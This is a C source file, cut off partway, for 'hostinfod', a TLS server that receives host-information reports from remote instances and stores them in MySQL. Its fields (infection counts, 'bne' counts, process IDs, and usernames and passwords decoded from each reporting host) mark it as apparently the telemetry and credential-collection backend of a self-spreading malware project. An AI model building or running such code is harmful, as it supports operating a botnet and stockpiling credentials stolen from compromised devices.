/*
* Copyright (c) 2019-2022 David Timber <dxdt@dev.snart.me>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <inttypes.h>
#include <signal.h>

#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <arpa/inet.h>

#include <sys/sysinfo.h>

#include <mysql/mysql.h>
#include <mbedtls/ssl.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>
#include <mbedtls/error.h>

#include "util_rt.h"
#include "llist.h"
#include "iobuf.h"
#include "protocol.h"
#include "mbedtls.h"
#include "rnd.h"
#include "yaml.h"

#if !defined(MBEDTLS_THREADING_C)
#error "Mbedtls must be compiled with threading support"
#endif


typedef enum {
	CS_HANDSHAKE,
	CS_PROC,
	CS_SHUT,
	CS_CLOSE
} client_state_t;

typedef struct {
	prne_htbt_host_info_t hi;
	struct sockaddr_in6 sa;
} db_qe_t;

typedef struct {
	struct timespec last_op;
	prne_iobuf_t ib[2];
	int sck;
	struct sockaddr_in6 sa;
	mbedtls_ssl_context ssl;
	uint16_t exp_msg_id;
	client_state_t con_state;
	struct {
		bool hi_sent;
		bool hi_received;
	} proto_state;
	char ipaddr_str[INET6_ADDRSTRLEN];
} client_ctx_t;

typedef struct {
	int ihcp[2];
	struct pollfd *pfd;
	prne_rnd_t rnd;
	prne_llist_t p_list;
	prne_llist_t c_list;
	pthread_t th;
	pthread_mutex_t lock;
	bool term;
} th_ctx_t;

typedef struct {
	prne_llist_t q;
	pthread_t th;
	pthread_mutex_t lock;
	pthread_cond_t cv;
	MYSQL c;
	bool term;
} db_ctx_t;

static const uint16_t			DEFCONF_DB_PORT =			3306;
static const size_t				DEFCONF_MAX_CONN =			SIZE_MAX;
static const size_t				DEFCONF_DB_Q_SIZE =			SIZE_MAX;
static const struct timespec	DEFCONF_REPORT_INT =		{ 60, 0 };
static const struct timespec	DEFCONF_SCK_OP_TIMEOUT =	{ 5, 0 };
static const unsigned int		DEFCONF_BACKLOG =			10;
static const int				DEFCONF_VERBOSE =			PRNE_VL_WARN;
static const uint16_t			DEFCONF_LISTEN_PORT =		64420;

struct {
	struct {
		char *host;
		char *db;
		char *user;
		char *pw;
		char *tbl_pfx;
		uint16_t port;
	} db;
	struct {
		char *path_ca;
		char *path_crt;
		char *path_key;
		char *path_dh;
		char *key_pw;
	} ssl;
	size_t max_conn;
	size_t db_q_size;
	struct timespec report_int;
	struct timespec sck_op_timeout;
	unsigned int nb_thread;
	unsigned int backlog;
	int verbose;
	uint16_t listen_port;
} prog_conf;

struct {
	db_ctx_t db_ctx;
	struct {
		mbedtls_x509_crt ca;
		mbedtls_x509_crt crt;
		mbedtls_pk_context key;
		mbedtls_dhm_context dh;
		mbedtls_ssl_config conf;
		mbedtls_entropy_context entropy;
		mbedtls_ctr_drbg_context ctr_drbg;
	} ssl;
	struct {
		pthread_mutex_t lock;
		size_t cnt;
	} conn_ctr;
	pthread_mutex_t stdio_lock;
} prog_g;

static const struct timespec ZERO_TIMESPEC;

static int sigpipe[2] = { -1, -1 };
static uint8_t sewage;


static void print_help (const char *prog, FILE *o) {
	fprintf(
		o,
		"Usage: %s <config>\n",
		prog);
}

static unsigned int get_hwconc (void) {
	return (unsigned int)get_nprocs();
}

static void set_def_prog_param (void) {
	prog_conf.db.tbl_pfx = prne_dup_str("prne-");
	prog_conf.db.port = DEFCONF_DB_PORT;
	prog_conf.max_conn = DEFCONF_MAX_CONN;
	prog_conf.db_q_size = DEFCONF_DB_Q_SIZE;
	prog_conf.report_int = DEFCONF_REPORT_INT;
	prog_conf.sck_op_timeout = DEFCONF_SCK_OP_TIMEOUT;
	prog_conf.nb_thread = get_hwconc();
	prog_conf.backlog = DEFCONF_BACKLOG;
	prog_conf.verbose = DEFCONF_VERBOSE;
	prog_conf.listen_port = DEFCONF_LISTEN_PORT;
}

static void dup_assign_str (char **dst, const char *src) {
	void *ny = prne_redup_str(*dst, src);
	if (ny == NULL) {
		perror("prne_redup_str()");
		abort();
	}
	*dst = (char*)ny;
}

bool yaml_doc_end_cb (void *ctx, const yaml_event_t *event) {
	// Accept the first doc only.
	return false;
}

static bool yaml_scalar_cb (
	void *ctx,
	const char *val,
	const prne_yaml_path_t *path_obj)
{
	const char *err_msg = NULL;
	char *path = NULL;
	bool ret = true;

	path = prne_yaml_path_tostr(path_obj, ".", true, NULL);
	prne_assert(path != NULL);

	if (strstr(path, ".hostinfod") != path) {
		ret = false;
		fprintf(stderr, "%s: invalid root\n", path);
		goto END;
	}

	if (strcmp(path, ".hostinfod.db.host") == 0) {
		dup_assign_str(&prog_conf.db.host, val);
	}
	else if (strcmp(path, ".hostinfod.db.port") == 0) {
		int tmp;

		ret =
			sscanf((const char*)val, "%d", &tmp) == 1 &&
			(0 < tmp && tmp <= 65535);
		if (ret) {
			prog_conf.db.port = (uint16_t)tmp;
		}
		else {
			errno = EINVAL;
			err_msg = ".hostinfod.db.port";
		}
	}
	else if (strcmp(path, ".hostinfod.db.user") == 0) {
		dup_assign_str(&prog_conf.db.user, val);
	}
	else if (strcmp(path, ".hostinfod.db.pw") == 0) {
		dup_assign_str(&prog_conf.db.pw, val);
	}
	else if (strcmp(path, ".hostinfod.db.db") == 0) {
		dup_assign_str(&prog_conf.db.db, val);
	}
	else if (strcmp(path, ".hostinfod.db.table_prefix") == 0) {
		dup_assign_str(&prog_conf.db.tbl_pfx, val);
	}
	else if (strcmp(path, ".hostinfod.ssl.ca") == 0) {
		dup_assign_str(&prog_conf.ssl.path_ca, val);
	}
	else if (strcmp(path, ".hostinfod.ssl.crt") == 0) {
		dup_assign_str(&prog_conf.ssl.path_crt, val);
	}
	else if (strcmp(path, ".hostinfod.ssl.key") == 0) {
		dup_assign_str(&prog_conf.ssl.path_key, val);
	}
	else if (strcmp(path, ".hostinfod.ssl.key_pw") == 0) {
		dup_assign_str(&prog_conf.ssl.key_pw, val);
	}
	else if (strcmp(path, ".hostinfod.ssl.dh") == 0) {
		dup_assign_str(&prog_conf.ssl.path_dh, val);
	}
	else if (strcmp(path, ".hostinfod.max_conn") == 0) {
		ret = sscanf(val, "%zu", &prog_conf.max_conn) == 1;
		err_msg = ".hostinfod.max_conn";
	}
	else if (strcmp(path, ".hostinfod.db_q_size") == 0) {
		ret = sscanf(val, "%zu", &prog_conf.db_q_size) == 1;
		err_msg = ".hostinfod.db_q_size";
	}
	else if (strcmp(path, ".hostinfod.report_int") == 0) {
		unsigned long tmp;

		ret = sscanf(val, "%lu", &tmp) == 1;
		err_msg = ".hostinfod.report_int";
		if (ret) {
			prog_conf.report_int = prne_ms_timespec(tmp);
		}
	}
	else if (strcmp(path, ".hostinfod.sck_op_timeout") == 0) {
		unsigned long tmp;

		ret = sscanf(val, "%lu", &tmp) == 1;
		err_msg = ".hostinfod.sck_op_timeout";
		if (ret) {
			prog_conf.sck_op_timeout = prne_ms_timespec(tmp);
		}
	}
	else if (strcmp(path, ".hostinfod.nb_thread") == 0) {
		ret = sscanf(val, "%u", &prog_conf.nb_thread) == 1;
		err_msg = ".hostinfod.nb_thread";
	}
	else if (strcmp(path, ".hostinfod.backlog") == 0) {
		ret = sscanf(val, "%u", &prog_conf.backlog) == 1;
		err_msg = ".hostinfod.backlog";
	}
	else if (strcmp(path, ".hostinfod.listen_port") == 0) {
		ret = sscanf(val, "%"SCNu16, &prog_conf.listen_port) == 1;
		err_msg = ".hostinfod.listen_port";
	}
	else if (strcmp(path, ".hostinfod.verbose") == 0) {
		ret = sscanf(val, "%d", &prog_conf.verbose) == 1;
		err_msg = ".hostinfod.verbose";
	}

END:
	if (!ret) {
		*((bool*)ctx) = true;
		prne_assert(err_msg != NULL);
		perror(err_msg);
	}
	prne_free(path);

	return ret;
}

static bool load_conf (FILE *file) {
	yaml_parser_t parser;
	prne_yaml_ctx_t p_ctx;
	prne_yaml_parse_opt_t p_opt;
	prne_yaml_parse_ret_t p_ret;
	bool err = false;
	bool ret = false;

	prne_yaml_init_ctx(&p_ctx);
	prne_yaml_init_parse_opt(&p_opt);

	p_opt.uctx = &err;
	p_opt.cb.doc_end = yaml_doc_end_cb;
	p_opt.cb.scalar = yaml_scalar_cb;

	if (yaml_parser_initialize(&parser) == 0) {
		fprintf(stderr, "*** YAML error: %s\n", parser.problem);
		abort();
	}

	yaml_parser_set_input_file(&parser, file);
	p_ret = prne_yaml_do_parse(&parser, &p_ctx, &p_opt);
	switch (p_ret) {
	case PRNE_YAML_PR_CBHALT:
		if (err) {
			fprintf(
				stderr,
				"*** Config error at %zu:%zu\n",
				parser.mark.line,
				parser.mark.column);
			break;
		}
		else {
			// Halted at end of document. Fall through
		}
		/* fall-through */
	case PRNE_YAML_PR_END:
		ret = true;
		break;
	case PRNE_YAML_PR_ERRNO:
		perror("prne_yaml_do_parse()");
		break;
	case PRNE_YAML_PR_APIERR:
		fprintf(
			stderr,
			"*** YAML parse error %zu:%zu: %s\n",
			parser.problem_mark.line,
			parser.problem_mark.column,
			parser.problem);
		break;
	default:
		fprintf(
			stderr,
			"prne_yaml_do_parse(): %s\n",
			prne_yaml_pr_tostr(p_ret));
	}

	yaml_parser_delete(&parser);
	prne_yaml_free_ctx(&p_ctx);
	prne_yaml_free_parse_opt(&p_opt);

	return ret;
}

static int setup_conf (const char *conf_path) {
#define ERR_BREAK(msg, expr) \
	if (!(expr)) { \
		err_msg = (msg);\
		break;\
	}
	bool f_ret;
	const char *err_msg = NULL;
	FILE *file = fopen(conf_path, "r");

	if (file == NULL) {
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			perror(conf_path);
		}
		return 1;
	}

	set_def_prog_param();
	f_ret = load_conf(file);
	fclose(file);

	if (!f_ret) {
		return 2;
	}

	do {
		ERR_BREAK("`db.host` not set", prne_nstrlen(prog_conf.db.host) > 0);
		ERR_BREAK("`db.db` not set", prne_nstrlen(prog_conf.db.db) > 0);
		ERR_BREAK("`db.user` not set", prne_nstrlen(prog_conf.db.user) > 0);
		ERR_BREAK("invalid `db.port`", prog_conf.db.port > 0);
		ERR_BREAK("`ssl.ca` not set", prne_nstrlen(prog_conf.ssl.path_ca) > 0);
		ERR_BREAK(
			"`ssl.crt` not set",
			prne_nstrlen(prog_conf.ssl.path_crt) > 0);
		ERR_BREAK(
			"`ssl.key` not set",
			prne_nstrlen(prog_conf.ssl.path_key) > 0);
		ERR_BREAK("`ssl.dh` not set", prne_nstrlen(prog_conf.ssl.path_dh) > 0);
		ERR_BREAK("invalid `max_conn`", prog_conf.max_conn > 0);
		ERR_BREAK("invalid `db_q_size`", prog_conf.db_q_size > 0);
		ERR_BREAK(
			"invalid `sck_op_timeout`",
			prne_cmp_timespec(prog_conf.sck_op_timeout, ZERO_TIMESPEC) > 0);
		ERR_BREAK("invalid `nb_thread`", prog_conf.nb_thread > 0);
		ERR_BREAK("invalid `backlog`", prog_conf.backlog > 0);
		ERR_BREAK("invalid `listen_port`", prog_conf.listen_port > 0);
	} while (false);
	if (err_msg != NULL) {
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			fprintf(stderr, "*** Config error: %s\n", err_msg);
		}
		return 2;
	}

	return 0;
#undef ERR_BREAK
}

static void free_conf (void) {
	prne_free(prog_conf.db.host);
	prne_free(prog_conf.db.db);
	prne_free(prog_conf.db.user);
	prne_free(prog_conf.db.pw);
	prne_free(prog_conf.db.tbl_pfx);
	prne_free(prog_conf.ssl.path_ca);
	prne_free(prog_conf.ssl.path_crt);
	prne_free(prog_conf.ssl.path_key);
	prne_free(prog_conf.ssl.path_dh);
	prne_free(prog_conf.ssl.key_pw);
}

static int prep_socket (void) {
	const int ret = socket(AF_INET6, SOCK_STREAM, 0);
	struct sockaddr_in6 sa;
	int ov;

	if (ret < 0 || !prne_sck_fcntl(ret)) {
		goto ERR;
	}

	ov = 1;
	setsockopt(ret, SOL_SOCKET, SO_REUSEADDR, &ov, sizeof(ov));
	if (!prne_sck_fcntl(ret)) {
		goto ERR;
	}

	prne_memzero(&sa, sizeof(sa));
	sa.sin6_family = AF_INET6;
	// sa.sin6_addr = in6addr_any;
	sa.sin6_port = htons(prog_conf.listen_port);

	if (bind(ret, (const struct sockaddr*)&sa, sizeof(sa)) != 0) {
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			perror("*** bind()");
		}
		goto ERR;
	}
	if (listen(ret, prog_conf.backlog) != 0) {
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			perror("*** listen()");
		}
		goto ERR;
	}

	return ret;
ERR:
	prne_close(ret);
	return -1;
}

static void report_mysql_err (MYSQL *c) {
	pthread_mutex_lock(&prog_g.stdio_lock);
	fprintf(stderr, "* MySQL: %s\n", mysql_error(c));
	pthread_mutex_unlock(&prog_g.stdio_lock);
}

static void sync_perror (const char *msg) {
	pthread_mutex_lock(&prog_g.stdio_lock);
	perror(msg);
	pthread_mutex_unlock(&prog_g.stdio_lock);
}

static int init_global (void) {
#define ERR_BREAK(file, expr) \
	if ((f_ret = (expr)) != 0) {\
		f_name = (file);\
		break;\
	}
	my_bool bov;
	int f_ret;
	const char *f_name = "";

	if (pipe(sigpipe) != 0 ||
		!prne_sck_fcntl(sigpipe[0]) ||
		!prne_sck_fcntl(sigpipe[1]))
	{
		perror("*** pipe()");
		return 1;
	}

	bov = true;
	mysql_options(&prog_g.db_ctx.c, MYSQL_OPT_RECONNECT, &bov);
	mysql_options(&prog_g.db_ctx.c, MYSQL_SET_CHARSET_NAME, "utf8");
	if (mysql_real_connect(
		&prog_g.db_ctx.c,
		prog_conf.db.host,
		prog_conf.db.user,
		prog_conf.db.pw,
		prog_conf.db.db,
		prog_conf.db.port,
		NULL,
		CLIENT_MULTI_STATEMENTS) == NULL)
	{
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			report_mysql_err(&prog_g.db_ctx.c);
		}
		return 1;
	}

	do {
		static const char *ALPN_ARR[] = {
			PRNE_HTBT_TLS_ALP,
			NULL
		};

		ERR_BREAK(
			prog_conf.ssl.path_ca,
			mbedtls_x509_crt_parse_file(&prog_g.ssl.ca, prog_conf.ssl.path_ca));
		ERR_BREAK(
			prog_conf.ssl.path_crt,
			mbedtls_x509_crt_parse_file(
				&prog_g.ssl.crt,
				prog_conf.ssl.path_crt));
		ERR_BREAK(
			prog_conf.ssl.path_key,
			mbedtls_pk_parse_keyfile(
				&prog_g.ssl.key,
				prog_conf.ssl.path_key,
				prog_conf.ssl.key_pw));
		ERR_BREAK(
			prog_conf.ssl.path_dh,
			mbedtls_dhm_parse_dhmfile(
				&prog_g.ssl.dh,
				prog_conf.ssl.path_dh));

		ERR_BREAK(
			"mbedtls_ssl_config_defaults()",
			mbedtls_ssl_config_defaults(
				&prog_g.ssl.conf,
				MBEDTLS_SSL_IS_SERVER,
				MBEDTLS_SSL_TRANSPORT_STREAM,
				MBEDTLS_SSL_PRESET_DEFAULT));
		ERR_BREAK(
			"mbedtls_ssl_conf_own_cert()",
			mbedtls_ssl_conf_own_cert(
				&prog_g.ssl.conf,
				&prog_g.ssl.crt,
				&prog_g.ssl.key));
		ERR_BREAK(
			"mbedtls_ssl_conf_dh_param_ctx()",
			mbedtls_ssl_conf_dh_param_ctx(
				&prog_g.ssl.conf,
				&prog_g.ssl.dh));
		ERR_BREAK(
			"mbedtls_ssl_conf_alpn_protocols()",
			mbedtls_ssl_conf_alpn_protocols(
				&prog_g.ssl.conf,
				ALPN_ARR));
		mbedtls_ssl_conf_ca_chain(&prog_g.ssl.conf, &prog_g.ssl.ca, NULL);
		mbedtls_ssl_conf_authmode(
			&prog_g.ssl.conf,
			MBEDTLS_SSL_VERIFY_REQUIRED);
		mbedtls_ssl_conf_verify(
			&prog_g.ssl.conf,
			prne_mbedtls_x509_crt_verify_cb,
			NULL);
		mbedtls_ssl_conf_rng(
			&prog_g.ssl.conf,
			mbedtls_ctr_drbg_random,
			&prog_g.ssl.ctr_drbg);

		ERR_BREAK(
			"mbedtls_ctr_drbg_seed()",
			mbedtls_ctr_drbg_seed(
				&prog_g.ssl.ctr_drbg,
				mbedtls_entropy_func,
				&prog_g.ssl.entropy,
				NULL,
				0));
	} while (false);
	if (f_ret != 0) {
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			char str[256];

			str[0] = 0;
			mbedtls_strerror(f_ret, str, sizeof(str));
			fprintf(stderr, "*** %s: %s\n", f_name, str);
		}

		return 1;
	}

	return 0;
#undef ERR_BREAK
}

static void handle_termsig (const int s) {
	const int saved_errno = errno;

	write(sigpipe[1], &sewage, 1);
	signal(s, SIG_DFL);

	errno = saved_errno;
}

static void init_signals (void) {
	signal(SIGPIPE, SIG_IGN);
	signal(SIGINT, handle_termsig);
	signal(SIGTERM, handle_termsig);
}

static int build_hostinfo_query_str (
	const prne_htbt_host_info_t *hi,
	const struct sockaddr_in6 *sa,
	const char *cred_id,
	const char *cred_pw,
	const char *flags,
	char *const buf,
	const size_t size)
{
	return snprintf(
		buf,
		size,
		"SET\n"
		"\t@`instance_id` = UNHEX('"
		"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X'),\n"
		"\t@`org_id` = UNHEX('"
		"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X'),\n"
		"\t@`parent_uptime` = %"PRIu32",\n"
		"\t@`child_uptime` = %"PRIu32",\n"
		"\t@`bne_cnt` = %"PRIu64",\n"
		"\t@`infect_cnt` = %"PRIu64",\n"
		"\t@`parent_pid` = %"PRIu32",\n"
		"\t@`child_pid` = %"PRIu32",\n"
		"\t@`prog_ver` = UNHEX('"
		"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X'),\n"
		"\t@`boot_id` = UNHEX('"
		"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X'),\n"
		"\t@`cred_id` = %s,\n"
		"\t@`cred_pw` = %s,\n"
		"\t@`crash_cnt` = %"PRIu32",\n"
		"\t@`arch` = %d,\n"
		"\t@`os` = %d,\n"
		"\t@`flags` = %s,\n"
		"\t@`ipaddr` = UNHEX('"
		"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X');\n"
		"INSERT INTO `%shi`\n"
		"SET\n"
		"\t`instance_id` = @`instance_id`,\n"
		"\t`org_id` = @`org_id`,\n"
		"\t`inserted` = UTC_TIMESTAMP,\n"
		"\t`updated` = UTC_TIMESTAMP,\n"
		"\t`parent_uptime` = @`parent_uptime`,\n"
		"\t`child_uptime` = @`child_uptime`,\n"
		"\t`bne_cnt` = @`bne_cnt`,\n"
		"\t`infect_cnt` = @`infect_cnt`,\n"
		"\t`parent_pid` = @`parent_pid`,\n"
		"\t`child_pid` = @`child_pid`,\n"
		"\t`prog_ver` = @`prog_ver`,\n"
		"\t`boot_id` = @`boot_id`,\n"
		"\t`cred_id` = @`cred_id`,\n"
		"\t`cred_pw` = @`cred_pw`,\n"
		"\t`crash_cnt` = @`crash_cnt`,\n"
		"\t`arch` = @`arch`,\n"
		"\t`os` = @`os`,\n"
		"\t`flags` = @`flags`,\n"
		"\t`ipaddr` = @`ipaddr`\n"
		"ON DUPLICATE KEY UPDATE\n"
		"\t`updated` = UTC_TIMESTAMP,\n"
		"\t`parent_uptime` = @`parent_uptime`,\n"
		"\t`child_uptime` = @`child_uptime`,\n"
		"\t`bne_cnt` = @`bne_cnt`,\n"
		"\t`infect_cnt` = @`infect_cnt`,\n"
		"\t`child_pid` = @`child_pid`,\n"
		"\t`crash_cnt` = @`crash_cnt`,\n"
		"\t`ipaddr` = @`ipaddr`;\n"
		"COMMIT;\n",
		hi->instance_id[0],
		hi->instance_id[1],
		hi->instance_id[2],
		hi->instance_id[3],
		hi->instance_id[4],
		hi->instance_id[5],
		hi->instance_id[6],
		hi->instance_id[7],
		hi->instance_id[8],
		hi->instance_id[9],
		hi->instance_id[10],
		hi->instance_id[11],
		hi->instance_id[12],
		hi->instance_id[13],
		hi->instance_id[14],
		hi->instance_id[15],
		hi->org_id[0],
		hi->org_id[1],
		hi->org_id[2],
		hi->org_id[3],
		hi->org_id[4],
		hi->org_id[5],
		hi->org_id[6],
		hi->org_id[7],
		hi->org_id[8],
		hi->org_id[9],
		hi->org_id[10],
		hi->org_id[11],
		hi->org_id[12],
		hi->org_id[13],
		hi->org_id[14],
		hi->org_id[15],
		hi->parent_uptime,
		hi->child_uptime,
		hi->bne_cnt,
		hi->infect_cnt,
		hi->parent_pid,
		hi->child_pid,
		hi->prog_ver[0],
		hi->prog_ver[1],
		hi->prog_ver[2],
		hi->prog_ver[3],
		hi->prog_ver[4],
		hi->prog_ver[5],
		hi->prog_ver[6],
		hi->prog_ver[7],
		hi->prog_ver[8],
		hi->prog_ver[9],
		hi->prog_ver[10],
		hi->prog_ver[11],
		hi->prog_ver[12],
		hi->prog_ver[13],
		hi->prog_ver[14],
		hi->prog_ver[15],
		hi->boot_id[0],
		hi->boot_id[1],
		hi->boot_id[2],
		hi->boot_id[3],
		hi->boot_id[4],
		hi->boot_id[5],
		hi->boot_id[6],
		hi->boot_id[7],
		hi->boot_id[8],
		hi->boot_id[9],
		hi->boot_id[10],
		hi->boot_id[11],
		hi->boot_id[12],
		hi->boot_id[13],
		hi->boot_id[14],
		hi->boot_id[15],
		cred_id,
		cred_pw,
		hi->crash_cnt,
		hi->arch,
		hi->os,
		flags,
		((const uint8_t*)&sa->sin6_addr)[0],
		((const uint8_t*)&sa->sin6_addr)[1],
		((const uint8_t*)&sa->sin6_addr)[2],
		((const uint8_t*)&sa->sin6_addr)[3],
		((const uint8_t*)&sa->sin6_addr)[4],
		((const uint8_t*)&sa->sin6_addr)[5],
		((const uint8_t*)&sa->sin6_addr)[6],
		((const uint8_t*)&sa->sin6_addr)[7],
		((const uint8_t*)&sa->sin6_addr)[8],
		((const uint8_t*)&sa->sin6_addr)[9],
		((const uint8_t*)&sa->sin6_addr)[10],
		((const uint8_t*)&sa->sin6_addr)[11],
		((const uint8_t*)&sa->sin6_addr)[12],
		((const uint8_t*)&sa->sin6_addr)[13],
		((const uint8_t*)&sa->sin6_addr)[14],
		((const uint8_t*)&sa->sin6_addr)[15],
		prog_conf.db.tbl_pfx);
}

static void db_sync_msg (db_ctx_t *c, const char *msg) {
	pthread_mutex_lock(&prog_g.stdio_lock);
	fprintf(stderr, "db@%"PRIxPTR": %s\n", (uintptr_t)c, msg);
	pthread_mutex_unlock(&prog_g.stdio_lock);
}

static bool handle_db_qe (
	db_ctx_t *ctx,
	const db_qe_t *e)
{
	struct {
		char *cred_id;
		char *cred_pw;
		char *flags;
	} qv;
	char *q_str = NULL;
	size_t q_len = 0;
	prne_host_cred_t hc;
	int f_ret;
	bool ret = false, sql_err = true;

	prne_init_host_cred(&hc);
	prne_memzero(&qv, sizeof(qv));

// TRY
	if (prne_dec_host_cred(
		e->hi.host_cred,
		e->hi.host_cred_len,
		&hc) == PRNE_HTBT_SER_RC_OK)
	{
		unsigned long len;
		size_t cred_l[2], sl[2];

		cred_l[0] = strlen(hc.id);
		cred_l[1] = strlen(hc.pw);

		sl[0] = 2 + cred_l[0] * 2;
		qv.cred_id = prne_alloc_str(sl[0]);
		sl[1] = 2 + cred_l[1] * 2;
		qv.cred_pw = prne_alloc_str(sl[1]);
		if (qv.cred_id == NULL || qv.cred_pw == NULL) {
			goto END;
		}
		prne_memzero(qv.cred_id, sl[0] + 1);
		prne_memzero(qv.cred_pw, sl[1] + 1);

		qv.cred_id[0] = '\'';
		len = mysql_real_escape_string(
			&ctx->c,
			qv.cred_id + 1,
			hc.id,
			cred_l[0]);
		qv.cred_id[len + 1] = '\'';
		qv.cred_id[len + 2] = 0;

		qv.cred_pw[0] = '\'';
		len = mysql_real_escape_string(
			&ctx->c,
			qv.cred_pw + 1,
			hc.pw,
			cred_l[1]);
		qv.cred_pw[len + 1] = '\'';
		qv.cred_pw[len + 2] = 0;
	}
	else {
		qv.cred_id = prne_dup_str("NULL");
		qv.cred_pw = prne_dup_str("NULL");
		if (qv.cred_id == NULL || qv.cred_pw == NULL) {
			goto END;
		}
	}

	if (e->hi.bf_len > 0) {
		char *hex, *p;
		const char *sb[] = { "UNHEX('", NULL, "')" };

		p = hex = prne_alloc_str(e->hi.bf_len * 2);
		if (hex == NULL) {
			goto END;
		}
		for (size_t i = 0; i < e->hi.bf_len; i += 1) {
			prne_hex_tochar(e->hi.bf[i], p, false);
			p += 2;
		}
		*p = 0;

		sb[1] = hex;
		qv.flags = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
	}
	else {
		qv.flags = prne_dup_str("NULL");
	}
	if (qv.flags == NULL) {
		goto END;
	}

	if (prog_conf.verbose >= PRNE_VL_DBG0 + 1) {
		const char *pr[2] = { qv.cred_id, qv.cred_pw };

		for (const char *p = pr[0]; *p != 0; p += 1) {
			if (!prne_cisspace(*p)) {
				pr[0] = "(bin)";
				break;
			}
		}
		for (const char *p = pr[1]; *p != 0; p += 1) {
			if (!prne_cisspace(*p)) {
				pr[1] = "(bin)";
				break;
			}
		}

		pthread_mutex_lock(&prog_g.stdio_lock);
		fprintf(
			stderr,
			"db@%"PRIxPTR": hostinfo("
			"parent_uptime = %"PRIu32", "
			"child_uptime = %"PRIu32", "
			"bne_cnt = %"PRIu64", "
			"infect_cnt = %"PRIu64", "
			"parent_pid = %"PRIu32", "
			"child_pid = %"PRIu32", "
			"prog_ver = %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X, "
			"boot_id = %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X, "
			"instance_id = %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X, "
			"org_id = %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X, "
			"host_cred.id = %s, "
			"host_cred.pw = %s, "
			"crash_cnt = %"PRIu32", "
			"arch = %d, "
			"os = %d)\n",
			(uintptr_t)ctx,
			e->hi.parent_uptime,
			e->hi.child_uptime,
			e->hi.bne_cnt,
			e->hi.infect_cnt,
			e->hi.parent_pid,
			e->hi.child_pid,
			e->hi.prog_ver[0],
			e->hi.prog_ver[1],
			e->hi.prog_ver[2],
			e->hi.prog_ver[3],
			e->hi.prog_ver[4],
			e->hi.prog_ver[5],
			e->hi.prog_ver[6],
			e->hi.prog_ver[7],
			e->hi.prog_ver[8],
			e->hi.prog_ver[9],
			e->hi.prog_ver[10],
			e->hi.prog_ver[11],
			e->hi.prog_ver[12],
			e->hi.prog_ver[13],
			e->hi.prog_ver[14],
			e->hi.prog_ver[15],
			e->hi.boot_id[0],
			e->hi.boot_id[1],
			e->hi.boot_id[2],
			e->hi.boot_id[3],
			e->hi.boot_id[4],
			e->hi.boot_id[5],
			e->hi.boot_id[6],
			e->hi.boot_id[7],
			e->hi.boot_id[8],
			e->hi.boot_id[9],
			e->hi.boot_id[10],
			e->hi.boot_id[11],
			e->hi.boot_id[12],
			e->hi.boot_id[13],
			e->hi.boot_id[14],
			e->hi.boot_id[15],
			e->hi.instance_id[0],
			e->hi.instance_id[1],
			e->hi.instance_id[2],
			e->hi.instance_id[3],
			e->hi.instance_id[4],
			e->hi.instance_id[5],
			e->hi.instance_id[6],
			e->hi.instance_id[7],
			e->hi.instance_id[8],
			e->hi.instance_id[9],
			e->hi.instance_id[10],
			e->hi.instance_id[11],
			e->hi.instance_id[12],
			e->hi.instance_id[13],
			e->hi.instance_id[14],
			e->hi.instance_id[15],
			e->hi.org_id[0],
			e->hi.org_id[1],
			e->hi.org_id[2],
			e->hi.org_id[3],
			e->hi.org_id[4],
			e->hi.org_id[5],
			e->hi.org_id[6],
			e->hi.org_id[7],
			e->hi.org_id[8],
			e->hi.org_id[9],
			e->hi.org_id[10],
			e->hi.org_id[11],
			e->hi.org_id[12],
			e->hi.org_id[13],
			e->hi.org_id[14],
			e->hi.org_id[15],
			pr[0],
			pr[1],
			e->hi.crash_cnt,
			e->hi.arch,
			e->hi.os);
		pthread_mutex_unlock(&prog_g.stdio_lock);
	}

	f_ret = build_hostinfo_query_str(
		&e->hi,
		&e->sa,
		qv.cred_id,
		qv.cred_pw,
		qv.flags,
		NULL,
		0);
	if (f_ret < 0) {
		goto END;
	}
	q_str = prne_alloc_str((size_t)f_ret);
	if (q_str == NULL) {
		goto END;
	}
	q_len = (size_t)f_ret;
	build_hostinfo_query_str(
		&e->hi,
		&e->sa,
		qv.cred_id,
		qv.cred_pw,
		qv.flags,
		q_str,
		q_len + 1);
	if (prog_conf.verbose >= PRNE_VL_DBG0 + 2) {
